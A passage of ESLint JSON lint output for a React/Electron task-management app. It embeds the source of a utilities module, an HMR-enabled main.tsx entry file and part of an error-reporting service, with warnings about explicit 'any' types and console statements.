type.","line":188,"column":46,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":188,"endColumn":49,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5765,5768],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5765,5768],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":188,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":188,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5775,5778],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5775,5778],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":210,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":210,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6289,6292],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6289,6292],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":8,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { type ClassValue, clsx } from \"clsx\"\nimport { twMerge } from \"tailwind-merge\"\nimport { Task, Analytics } from \"@/types\"\n\nexport function cn(...inputs: ClassValue[]) {\n  return twMerge(clsx(inputs))\n}\n\nexport function formatDate(date: string | Date): string {\n  const d = new Date(date)\n  return d.toLocaleDateString('en-US', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric'\n  })\n}\n\nexport function formatDateTime(date: string | Date): string {\n  const d = new Date(date)\n  return d.toLocaleDateString('en-US', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    hour: '2-digit',\n    minute: '2-digit'\n  })\n}\n\nexport function getRelativeTime(date: string | Date): string {\n  const d = new Date(date)\n  const now = new Date()\n  const diff = now.getTime() - d.getTime()\n  const days = Math.floor(diff / (1000 * 60 * 60 * 24))\n  \n  if (days === 0) return 'Today'\n  if (days === 1) return 'Yesterday'\n  if (days < 7) return `${days} days ago`\n  if (days < 30) return `${Math.floor(days / 7)} weeks ago`\n  if (days < 365) return `${Math.floor(days / 30)} months ago`\n  return `${Math.floor(days / 365)} years ago`\n}\n\nexport function getPriorityColor(priority: Task['priority']): string {\n  switch (priority) {\n    case 'high':\n      return 'text-red-600 bg-red-50 border-red-200'\n    case 'medium':\n      return 'text-orange-600 bg-orange-50 border-orange-200'\n    case 'low':\n      return 'text-green-600 bg-green-50 border-green-200'\n    default:\n      return 'text-gray-600 bg-gray-50 border-gray-200'\n  }\n}\n\nexport function getStatusColor(status: Task['status']): string {\n  switch (status) {\n    case 'done':\n      return 'text-emerald-700 bg-emerald-100 border-emerald-300'\n    case 'in-progress':\n      return 'text-blue-700 bg-blue-100 border-blue-300'\n    case 'review':\n      return 'text-purple-700 bg-purple-100 border-purple-300'\n    case 'pending':\n      return 'text-gray-700 bg-gray-100 border-gray-300'\n    case 'deferred':\n      return 'text-yellow-700 bg-yellow-100 border-yellow-300'\n    case 'cancelled':\n      return 'text-red-700 bg-red-100 border-red-300'\n    default:\n      return 'text-gray-700 bg-gray-100 border-gray-300'\n  }\n}\n\nexport function calculateTaskProgress(task: Task): number {\n  if (task.status === 'done') return 100\n  if (task.status === 'cancelled') return 0\n  \n  if (task.subtasks.length === 0) {\n    switch (task.status) {\n      case 'in-progress':\n        return 50\n      case 'review':\n        return 90\n      default:\n        return 0\n    }\n  }\n  \n  const completedSubtasks = task.subtasks.filter(s => s.status === 'done').length\n  return Math.round((completedSubtasks / task.subtasks.length) * 100)\n}\n\nexport function generateAnalytics(tasks: Task[]): Analytics {\n  const totalTasks = tasks.length\n  const completedTasks = tasks.filter(t => t.status === 'done').length\n  const inProgressTasks = tasks.filter(t => t.status === 'in-progress').length\n  const pendingTasks = tasks.filter(t => t.status === 'pending').length\n  \n  const completionRate = totalTasks > 0 ? (completedTasks / totalTasks) * 100 : 0\n  \n  const tasksByPriority = tasks.reduce((acc, task) => {\n    acc[task.priority] = (acc[task.priority] || 0) + 1\n    return acc\n  }, {} as Record<Task['priority'], number>)\n  \n  const tasksByStatus = tasks.reduce((acc, task) => {\n    acc[task.status] = (acc[task.status] || 0) + 1\n    return acc\n  }, {} as Record<Task['status'], number>)\n  \n  // Mock velocity metrics for now\n  const velocityMetrics = {\n    tasksCompletedLastWeek: Math.floor(completedTasks * 0.3),\n    tasksCompletedThisWeek: Math.floor(completedTasks * 0.4),\n    trend: 'up' as const\n  }\n  \n  // Generate burndown data\n  const burndownData = Array.from({ length: 30 }, (_, i) => ({\n    date: new Date(Date.now() - (29 - i) * 24 * 60 * 60 * 1000).toISOString().split('T')[0],\n    remaining: Math.max(0, totalTasks - Math.floor((i / 29) * completedTasks)),\n    completed: Math.floor((i / 29) * completedTasks)\n  }))\n  \n  return {\n    totalTasks,\n    completedTasks,\n    inProgressTasks,\n    pendingTasks,\n    completionRate,\n    averageCompletionTime: 3.5, // Mock average in days\n    tasksByPriority,\n    tasksByStatus,\n    velocityMetrics,\n    burndownData\n  }\n}\n\nexport function filterTasks(tasks: Task[], filters: any): Task[] {\n  return tasks.filter(task => {\n    if (filters.status && !filters.status.includes(task.status)) return false\n    if (filters.priority && !filters.priority.includes(task.priority)) return false\n    if (filters.search) {\n      const searchLower = filters.search.toLowerCase()\n      if (!task.title.toLowerCase().includes(searchLower) && \n          !task.description.toLowerCase().includes(searchLower)) {\n        return false\n      }\n    }\n    return true\n  })\n}\n\nexport function sortTasks(tasks: Task[], sortBy: string, sortOrder: 'asc' | 'desc'): Task[] {\n  return [...tasks].sort((a, b) => {\n    let aValue: any = a[sortBy as keyof Task]\n    let bValue: any = b[sortBy as keyof Task]\n    \n    if (sortBy === 'priority') {\n      const priorityOrder = { low: 1, medium: 2, high: 3 }\n      aValue = priorityOrder[a.priority]\n      bValue = priorityOrder[b.priority]\n    }\n    \n    if (typeof aValue === 'string') {\n      aValue = aValue.toLowerCase()\n      bValue = bValue.toLowerCase()\n    }\n    \n    if (aValue < bValue) return sortOrder === 'asc' ? -1 : 1\n    if (aValue > bValue) return sortOrder === 'asc' ? 1 : -1\n    return 0\n  })\n}\n\nexport function debounce<T extends (...args: any[]) => any>(\n  func: T,\n  wait: number\n): (...args: Parameters<T>) => void {\n  let timeout: ReturnType<typeof setTimeout>\n  return (...args: Parameters<T>) => {\n    clearTimeout(timeout)\n    timeout = setTimeout(() => func(...args), wait)\n  }\n}\n\nexport function throttle<T extends (...args: any[]) => any>(\n  func: T,\n  limit: number\n): (...args: Parameters<T>) => void {\n  let inThrottle: boolean\n  return (...args: Parameters<T>) => {\n    if (!inThrottle) {\n      func(...args)\n      inThrottle = true\n      setTimeout(() => (inThrottle = false), limit)\n    }\n  }\n}\n\nexport function generateId(): number {\n  return Math.floor(Math.random() * 1000000) + Date.now()\n}\n\nexport function copyToClipboard(text: string): Promise<void> {\n  return navigator.clipboard.writeText(text)\n}\n\nexport function downloadJSON(data: any, filename: string): void {\n  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' })\n  const url = URL.createObjectURL(blob)\n  const a = document.createElement('a')\n  a.href = url\n  a.download = filename\n  document.body.appendChild(a)\n  a.click()\n  document.body.removeChild(a)\n  URL.revokeObjectURL(url)\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/main.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":23,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":23,"endColumn":18,"suggestions":[{"fix":{"range":[764,820],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":31,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":31,"endColumn":18,"suggestions":[{"fix":{"range":[1023,1099],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":34,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":34,"endColumn":19,"suggestions":[{"fix":{"range":[1154,1219],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":43,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":43,"endColumn":16,"suggestions":[{"fix":{"range":[1460,1507],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":47,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":47,"endColumn":16,"suggestions":[{"fix":{"range":[1569,1622],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":53,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":53,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1746,1749],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1746,1749],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":60,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":60,"endColumn":16,"suggestions":[{"fix":{"range":[1989,2044],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":61,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":61,"endColumn":16,"suggestions":[{"fix":{"range":[2049,2123],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":69,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":69,"endColumn":18,"suggestions":[{"fix":{"range":[2326,2362],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":70,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":70,"endColumn":18,"suggestions":[{"fix":{"range":[2367,2398],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":71,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":71,"endColumn":18,"suggestions":[{"fix":{"range":[2403,2443],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":72,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":72,"endColumn":21,"suggestions":[{"fix":{"range":[2448,2467],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":12,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React from 'react'\nimport ReactDOM from 'react-dom/client'\nimport App from './App.tsx'\nimport { ErrorBoundary } from './components/error/ErrorBoundary'\nimport { SuspenseWrapper } from './components/ui/SuspenseWrapper'\nimport './styles/globals.css'\n\n// ============================================\n// ðŸ”¥ Enhanced electron-vite HMR Support - 2025 Best Practices ðŸ”¥\n// ============================================\n\n// HMR State Preservation and Enhanced Error Handling\nlet hmrErrorCount = 0;\nconst MAX_HMR_ERRORS = 5;\n\nif (import.meta.hot) {\n  // Accept updates for this module\n  import.meta.hot.accept()\n  \n  // Accept updates for the App module specifically to preserve state\n  import.meta.hot.accept('./App.tsx', (newModule) => {\n    if (newModule) {\n      console.log('ðŸ”„ [HMR] App module updated successfully');\n      hmrErrorCount = 0; // Reset error count on successful update\n    }\n  })\n  \n  // Enhanced error handling for HMR failures\n  import.meta.hot.on('vite:error', (payload) => {\n    hmrErrorCount++;\n    console.error(`ðŸš¨ [HMR Error ${hmrErrorCount}/${MAX_HMR_ERRORS}]`, payload);\n    \n    if (hmrErrorCount >= MAX_HMR_ERRORS) {\n      console.warn('ðŸ”„ [HMR] Too many errors, suggesting full reload');\n      if (confirm('HMR has encountered multiple errors. Would you like to reload the page?')) {\n        window.location.reload();\n      }\n    }\n  })\n  \n  // Log HMR events for debugging\n  import.meta.hot.on('vite:beforeUpdate', () => {\n    console.log('ðŸ”¥ [HMR] Preparing to update...');\n  })\n  \n  import.meta.hot.on('vite:afterUpdate', () => {\n    console.log('âœ… [HMR] Update completed successfully');\n  })\n  \n  // HMR Development Utilities\n  if (import.meta.env.DEV) {\n    // Add global HMR debugging helpers\n    (window as any).__HMR_DEBUG__ = {\n      getErrorCount: () => hmrErrorCount,\n      resetErrorCount: () => { hmrErrorCount = 0; },\n      forceReload: () => window.location.reload(),\n      triggerUpdate: () => import.meta.hot?.invalidate(),\n    };\n    \n    console.log('ðŸ”¥ [HMR] Enhanced hot reloading enabled');\n    console.log('ðŸ› ï¸  [HMR] Debug helpers available at window.__HMR_DEBUG__');\n  }\n}\n\n// Error handler for app-level errors\nconst _handleAppError = (error: Error, errorInfo: React.ErrorInfo) => {\n  // In development, log detailed error information\n  if (import.meta.env.DEV) {\n    console.group('ðŸš¨ App-Level Error');\n    console.error('Error:', error);\n    console.error('Error Info:', errorInfo);\n    console.groupEnd();\n  }\n  \n  // In production, you might want to send this to an error reporting service\n  // Example: Sentry, LogRocket, etc.\n  if (import.meta.env.PROD) {\n    // reportToErrorService(error, errorInfo);\n  }\n}\n\nReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <ErrorBoundary \n      level=\"app\" \n      onError={_handleAppError}\n    >\n      <SuspenseWrapper \n        level=\"app\" \n        name=\"TaskMaster Application\"\n      >\n        <App />\n      </SuspenseWrapper>\n    </ErrorBoundary>\n  </React.StrictMode>,\n)","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/services/ErrorReportingService.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":31,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":31,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[816,819],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[816,819],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":13,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":16,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[999,1002],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[999,1002],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":152,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":152,"endColumn":18,"suggestions":[{"fix":{"range":[3883,3985],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":225,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":225,"endColumn":24,"suggestions":[{"fix":{"range":[5795,5869],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":228,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":228,"endColumn":23,"suggestions":[{"fix":{"range":[5920,5991],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":236,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":236,"endColumn":20,"suggestions":[{"fix":{"range":[6165,6221],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":313,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":313,"endColumn":22,"suggestions":[{"fix":{"range":[8196,8256],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":317,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":317,"endColumn":21,"suggestions":[{"fix":{"range":[8333,8401],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":326,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":326,"endColumn":20,"suggestions":[{"fix":{"range":[8633,8679],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":366,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":366,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9576,9579],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9576,9579],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":366,"column":71,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":366,"endColumn":74,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9609,9612],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9609,9612],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":366,"column":107,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":366,"endColumn":110,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9645,9648],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9645,9648],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":375,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":375,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9975,9978],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9975,9978],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":448,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":448,"endColumn":21,"suggestions":[{"fix":{"range":[11849,11902],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":476,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":476,"endColumn":19,"suggestions":[{"fix":{"range":[12611,12668],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":487,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":487,"endColumn":19,"suggestions":[{"fix":{"range":[12907,12963],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":501,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":501,"endColumn":19,"suggestions":[{"fix":{"range":[13254,13307],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":538,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":538,"endColumn":18,"suggestions":[{"fix":{"range":[14245,14278],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":539,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":539,"endColumn":18,"suggestions":[{"fix":{"range":[14283,14321],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":540,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":540,"endColumn":16,"suggestions":[{"fix":{"range":[14326,14366],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":541,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":541,"endColumn":16,"suggestions":[{"fix":{"range":[14371,14418],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":542,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":542,"endColumn":16,"suggestions":[{"fix":{"range":[14423,14464],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":544,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":544,"endColumn":18,"suggestions":[{"fix":{"range":[14499,14564],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":546,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":546,"endColumn":21,"suggestions":[{"fix":{"range":[14575,14594],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":586,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":586,"endColumn":19,"suggestions":[{"fix":{"range":[15508,15561],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":25,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Error Reporting Service (2025)\n * \n * Comprehensive error reporting service with user feedback mechanisms,\n * in-app reporting, and integration with error boundary systems.\n * \n * Features:\n * - User-initiated error reporting\n * - Automatic error tracking\n * - Offline support with retry logic\n * - User context collection\n * - Integration with external services (Sentry, etc.)\n * - Privacy-focused data collection\n */\n\nimport { ErrorInfo } from 'react';\n\n// Error context for enhanced reporting\nexport interface ErrorContext {\n  userInitiated?: boolean;\n  userInfo?: {\n    userId?: string;\n    sessionId?: string;\n    userAgent?: string;\n    timestamp?: string;\n  };\n  component?: string;\n  action?: string;\n  severity?: 'low' | 'medium' | 'high' | 'critical';\n  tags?: string[];\n  metadata?: Record<string, any>;\n}\n\n// Error report structure\nexport interface ErrorReport {\n  id: string;\n  timestamp: string;\n  error: {\n    name: string;\n    message: string;\n    stack?: string;\n    cause?: any;\n  };\n  errorInfo?: {\n    componentStack?: string;\n    errorBoundary?: string;\n  };\n  context: ErrorContext;\n  systemInfo: {\n    userAgent: string;\n    platform: string;\n    language: string;\n    screenSize: string;\n    url: string;\n    viewport: string;\n    memory?: number;\n    connection?: string;\n  };\n  appInfo: {\n    version: string;\n    environment: string;\n    buildId?: string;\n    feature?: string;\n  };\n}\n\n// User feedback structure\nexport interface UserFeedback {\n  reportId: string;\n  userEmail?: string;\n  userName?: string;\n  description: string;\n  steps?: string;\n  expectedBehavior?: string;\n  actualBehavior?: string;\n  severity?: 'low' | 'medium' | 'high' | 'critical';\n  category?: 'bug' | 'feature' | 'improvement' | 'question';\n  screenshots?: string[];\n  timestamp: string;\n}\n\n// Configuration for error reporting\nexport interface ErrorReportingConfig {\n  apiEndpoint?: string;\n  apiKey?: string;\n  enableErrorReporting?: boolean;\n  enableUserFeedback?: boolean;\n  enableOfflineSupport?: boolean;\n  maxErrorsPerSession?: number;\n  maxRetryAttempts?: number;\n  retryDelay?: number;\n  enableTelemetry?: boolean;\n  privacyMode?: boolean;\n  ignoredErrors?: string[];\n  enabledEnvironments?: string[];\n}\n\n// Default configuration\nconst _defaultConfig: Required<ErrorReportingConfig> = {\n  apiEndpoint: process.env.REACT_APP_ERROR_REPORTING_API || '/api/errors',\n  apiKey: process.env.REACT_APP_ERROR_REPORTING_KEY || '',\n  enableErrorReporting: process.env.NODE_ENV === 'production',\n  enableUserFeedback: true,\n  enableOfflineSupport: true,\n  maxErrorsPerSession: 10,\n  maxRetryAttempts: 3,\n  retryDelay: 1000,\n  enableTelemetry: process.env.NODE_ENV === 'production',\n  privacyMode: false,\n  ignoredErrors: [\n    'ResizeObserver loop limit exceeded',\n    'ResizeObserver loop completed with undelivered notifications',\n    'Non-Error promise rejection captured',\n    'Script error.',\n    'Network request failed'\n  ],\n  enabledEnvironments: ['production', 'staging', 'development']\n};\n\n/**\n * Error Reporting Service Implementation\n */\nclass ErrorReportingService {\n  private config: Required<ErrorReportingConfig>;\n  private errorCount = 0;\n  private pendingReports: ErrorReport[] = [];\n  private offlineQueue: ErrorReport[] = [];\n  private isOnline = navigator.onLine;\n  private sessionId: string;\n\n  constructor(config: Partial<ErrorReportingConfig> = {}) {\n    this.config = { ..._defaultConfig, ...config };\n    this.sessionId = this.generateSessionId();\n    \n    // Initialize service\n    this.initialize();\n  }\n\n  /**\n   * Initialize the error reporting service\n   */\n  private initialize(): void {\n    // Set up online/offline detection\n    this.setupNetworkDetection();\n    \n    // Set up global error handlers\n    this.setupGlobalErrorHandlers();\n    \n    // Process any queued reports from previous sessions\n    this.processOfflineQueue();\n    \n    console.debug('ðŸ” Error Reporting Service initialized', {\n      config: this.getPublicConfig()\n    });\n  }\n\n  /**\n   * Report an error with context\n   */\n  async reportError(\n    error: Error, \n    errorInfo?: ErrorInfo, \n    context: Partial<ErrorContext> = {}\n  ): Promise<string | null> {\n    if (!this.shouldReportError(error)) {\n      return null;\n    }\n\n    const report = this.createErrorReport(error, errorInfo, context);\n    \n    if (this.config.enableErrorReporting) {\n      return this.sendErrorReport(report);\n    }\n    \n    // In development, just log to console\n    if (process.env.NODE_ENV === 'development') {\n      this.logErrorReport(report);\n    }\n    \n    return report.id;\n  }\n\n  /**\n   * Report error with user context (for user-initiated reports)\n   */\n  async reportErrorWithUserContext(\n    error: Error,\n    errorInfo?: ErrorInfo,\n    context: Partial<ErrorContext> = {}\n  ): Promise<string | null> {\n    const enhancedContext: Partial<ErrorContext> = {\n      ...context,\n      userInitiated: true,\n      severity: context.severity || 'medium'\n    };\n\n    return this.reportError(error, errorInfo, enhancedContext);\n  }\n\n  /**\n   * Submit user feedback for an error\n   */\n  async submitUserFeedback(feedback: Omit<UserFeedback, 'timestamp'>): Promise<boolean> {\n    if (!this.config.enableUserFeedback) {\n      return false;\n    }\n\n    const enhancedFeedback: UserFeedback = {\n      ...feedback,\n      timestamp: new Date().toISOString()\n    };\n\n    try {\n      if (this.isOnline && this.config.apiEndpoint) {\n        const response = await fetch(`${this.config.apiEndpoint}/feedback`, {\n          method: 'POST',\n          headers: {\n            'Content-Type': 'application/json',\n            ...(this.config.apiKey && { 'Authorization': `Bearer ${this.config.apiKey}` })\n          },\n          body: JSON.stringify(enhancedFeedback)\n        });\n\n        if (response.ok) {\n          console.debug('User feedback submitted successfully:', feedback.reportId);\n          return true;\n        } else {\n          console.warn('Failed to submit user feedback:', await response.text());\n        }\n      } else {\n        // Queue for later if offline\n        this.queueOfflineFeedback(enhancedFeedback);\n        return true;\n      }\n    } catch (error) {\n      console.error('Error submitting user feedback:', error);\n      \n      // Queue for retry if offline support is enabled\n      if (this.config.enableOfflineSupport) {\n        this.queueOfflineFeedback(enhancedFeedback);\n        return true;\n      }\n    }\n\n    return false;\n  }\n\n  /**\n   * Create a structured error report\n   */\n  private createErrorReport(\n    error: Error,\n    errorInfo?: ErrorInfo,\n    context: Partial<ErrorContext> = {}\n  ): ErrorReport {\n    const id = this.generateReportId();\n    const timestamp = new Date().toISOString();\n\n    return {\n      id,\n      timestamp,\n      error: {\n        name: error.name,\n        message: error.message,\n        stack: this.config.privacyMode ? this.sanitizeStack(error.stack) : error.stack,\n        cause: error.cause\n      },\n      errorInfo: errorInfo ? {\n        componentStack: 